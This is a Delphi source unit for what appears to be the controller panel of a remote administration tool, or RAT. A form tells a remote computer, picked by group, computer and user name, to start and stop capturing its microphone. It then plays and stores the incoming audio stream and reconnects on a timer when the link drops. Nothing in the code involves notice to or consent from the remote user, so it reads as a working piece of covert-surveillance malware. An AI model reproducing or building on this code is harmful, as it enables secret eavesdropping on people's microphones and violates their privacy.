unit UnitAudioCapture;

interface

uses
  Windows, ScktComp,Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, UnitSharedData,
  Dialogs, StdCtrls, Buttons, ComCtrls, ExtCtrls, ImgList,ACMOut, ACMConvertor, MMSystem,
  Menus;

type
  TAudioCapture = class(TForm)
    ImageList1: TImageList;
    StatusBar1: TStatusBar;
    Splitter1: TSplitter;
    GroupBox1: TGroupBox;
    ListView1: TListView;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    BitBtn2: TBitBtn;
    BitBtn3: TBitBtn;
    ListView2: TListView;
    PopupMenu1: TPopupMenu;
    Play1: TMenuItem;
    N1: TMenuItem;
    Clear1: TMenuItem;
    DeleteSelected1: TMenuItem;
    Timer1: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure BitBtn2Click(Sender: TObject);
    procedure BitBtn3Click(Sender: TObject);
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure ListView2CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView2CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure Clear1Click(Sender: TObject);
    procedure ListView2Deletion(Sender: TObject; Item: TListItem);
    procedure DeleteSelected1Click(Sender: TObject);
    procedure Play1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    ACMO: TACMOut;
    ACMC: TACMConvertor;
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

var
  AudioCapture: TAudioCapture;

implementation

{$R *.dfm}


procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'AudioCapture|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TAudioCapture(SocketData.Form).NewSocket = nil then exit;
  TAudioCapture(SocketData.Form).Timer1.Enabled := True;
  TAudioCapture(SocketData.Form).NewSocket := nil;
  TAudioCapture(SocketData.Form).Caption := TAudioCapture(SocketData.Form).Caption + ' - [Offline]';
end;

procedure TAudioCapture.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  if BitBtn2.Enabled = False then BitBtn2.Click;
end;


procedure TAudioCapture.ParseData(Socket: TCustomWinSocket; Data: string);
var
  //Command: string;
  Stream: TMemoryStream;
  Li: TListItem;
begin
  //Command := Split(Data,'|',1);
  //Delete(Data,1,Length(Command)+1);

  if CheckBox1.Checked then ACMO.Play(pointer(Data)^,length(data));

  //if CheckBox2.Checked then begin
  Stream := TMemorystream.Create;
  stream.Write(pointer(Data)^,length(data));
  li := ListView2.Items.Add;
  li.Caption := inttostr(ListView2.Items.Count);
  li.SubItems.Add(inttostr(stream.Size));
  li.SubItems.Add(timetostr(time));
  li.Data := stream;
  li.ImageIndex := 0;
  //end;

end;



procedure TAudioCapture.FormCreate(Sender: TObject);
begin
  ACMO := TACMOut.Create(nil);
  ACMC := TACMConvertor.Create;
  ACMO.NumBuffers := 0;
  ACMO.Open(ACMC.FormatIn);
end;


procedure TAudioCapture.BitBtn2Click(Sender: TObject);
var
  Format: TWaveFormatEx;
  Stream: TMemoryStream;
  Command: string;
begin
  if not assigned(Listview1.Selected) then begin
    Listview1.Items[9].Selected := True;
  end;

  Listview2.Clear;

  if Listview1.Selected.SubItems[0] = 'Stereo' then Format.nChannels := 2
  else Format.nChannels := 1;

  Format.nSamplesPerSec := StrToInt(Listview1.Selected.Caption);

  Format.wBitsPerSample := 16;
  Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
  Format.nBlockAlign := Format.nChannels * 2;

  ACMC.FormatIn.Format.nChannels := Format.nChannels;
  ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
  ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
  ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
  ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;

  Stream := TMemoryStream.Create;
  Stream.WriteBuffer(Format, SizeOf(TWaveFormatEx));
  SetString(Command,pchar(Stream.memory),Stream.Size);
  Stream.Free;

  SendData(NewSocket,'Start|' + Command);

  Listview1.Enabled := False;
  BitBtn2.Enabled := False;
  BitBtn3.Enabled := True;


end;

procedure TAudioCapture.BitBtn3Click(Sender: TObject);
begin
  SendData(NewSocket,'Stop');
  BitBtn2.Enabled := True;
  BitBtn3.Enabled := False;
  Listview1.Enabled := True;

end;

procedure TAudioCapture.ListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := $F7F7F7;
end;

procedure TAudioCapture.ListView1CustomDrawSubItem(Sender: TCustomListView;
  Item: TListItem; SubItem: Integer; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := clWhite;
end;

procedure TAudioCapture.ListView2CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview2.Canvas.Brush.Color := $F7F7F7;
end;

procedure TAudioCapture.ListView2CustomDrawSubItem(Sender: TCustomListView;
  Item: TListItem; SubItem: Integer; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  Listview2.Canvas.Brush.Color := clWhite;
end;

procedure TAudioCapture.Clear1Click(Sender: TObject);
begin
  listview2.Clear;
end;

procedure TAudioCapture.ListView2Deletion(Sender: TObject;
  Item: TListItem);
begin
  TMemoryStream(Item.Data).Free;
end;

procedure TAudioCapture.DeleteSelected1Click(Sender: TObject);
var
  i: integer;
begin
  for i := Listview2.Items.Count -1 downto 0 do begin
    if listview2.Items[i].Selected then listview2.Items[i].Delete;
    application.ProcessMessages;
  end;
end;

procedure TAudioCapture.Play1Click(Sender: TObject);
var
  stream: tmemorystream;
  i: integer;
begin
  listview2.Enabled := False;
  for i := 0 to listview2.Items.Count -1 do begin
    application.ProcessMessages;
    if not listview2.Items[i].Selected then continue;
    stream := tmemorystream(listview2.items[i].Data);
    ACMO.Play(Stream.Memory^, Stream.Size);
  end;
  Listview2.Enabled := True;
end;

procedure TAudioCapture.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;    UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|AudioCaptureSocket|' + inttostr(Self.Handle));

end;

procedure TAudioCapture.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
begin
  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

end.
